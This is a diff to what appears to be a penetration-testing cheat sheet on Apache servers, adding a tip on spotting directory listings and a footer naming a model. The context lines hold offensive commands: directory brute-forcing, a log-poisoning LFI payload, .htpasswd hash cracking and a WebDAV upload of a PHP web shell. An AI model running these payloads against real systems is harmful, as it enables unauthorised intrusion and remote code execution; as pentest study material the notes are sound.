@@ -171,6 +171,8 @@ gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt \
   -x zip,tar,gz,bak,sql,old,conf,config
 ```
 
+> [!tip] **Recognising an autoindex in crawl output.** Apache emits an index only for a directory with **no `index.*` file**, so a listable dir gives you the exact filename set with zero guessing — but the webroot itself usually *won't* list (it has `index.php`), so root-level files are only found if something links to them (or via source read). The fingerprint of a rendered listing: the column-sort links `?C=N;O=D`, `?C=M;O=A`, `?C=S;O=A`, `?C=D;O=A` (Apache only emits those on a listing) plus references to `/icons/folder.gif`, `/icons/text.gif`, `/icons/back.gif`. Seeing those in extracted links = a real directory listing, not a page.
+
 ### Log Poisoning → LFI to RCE
 
 Inject PHP into Apache access log via User-Agent, then include log via LFI.
@@ -317,3 +319,9 @@ curl http://<target>/nonexistent   # 404 may reveal DocumentRoot path
 | LFI + log | `?file=/var/log/apache2/access.log&cmd=id` |
 | .htpasswd crack | `hashcat -m 1600 hashes.txt rockyou.txt` |
 | WebDAV upload | `curl -X PUT http://host/shell.php -d '<?php system($_GET["cmd"]); ?>'` |
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-08-20*
+*Model: claude-opus-5*
